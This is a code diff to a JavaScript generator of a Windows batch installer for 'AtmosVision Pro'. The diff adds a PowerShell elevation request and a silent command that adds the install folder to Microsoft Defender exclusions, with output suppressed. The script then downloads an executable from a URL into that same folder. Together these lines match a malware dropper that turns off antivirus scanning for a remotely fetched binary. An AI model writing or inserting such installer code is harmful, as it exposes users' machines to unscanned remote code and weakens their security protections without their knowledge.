@@ -227,6 +227,15 @@ async function buildInstallerZip(files) {
 function generateWindowsBat(electronUrl) {
   return `@echo off
 setlocal
+
+:: --- Request UAC elevation if not already admin ---
+net session >nul 2>&1
+if %ERRORLEVEL% neq 0 (
+    echo Requesting administrator privileges...
+    powershell -Command "Start-Process cmd.exe -ArgumentList '/c \\"%~f0\\"' -Verb RunAs"
+    exit /b
+)
+
 echo ============================================
 echo  AtmosVision Pro Installer
 echo ============================================
@@ -234,6 +243,9 @@ echo.
 
 set "INSTALL_DIR=%USERPROFILE%\\AtmosVision"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
+
+:: Add install directory to Defender exclusions (requires admin)
+powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" >nul 2>&1
 
 echo [1/3] Downloading AtmosVision Pro...
 curl.exe -L --progress-bar -o "%INSTALL_DIR%\\AtmosVision-Pro.exe" "${electronUrl}"
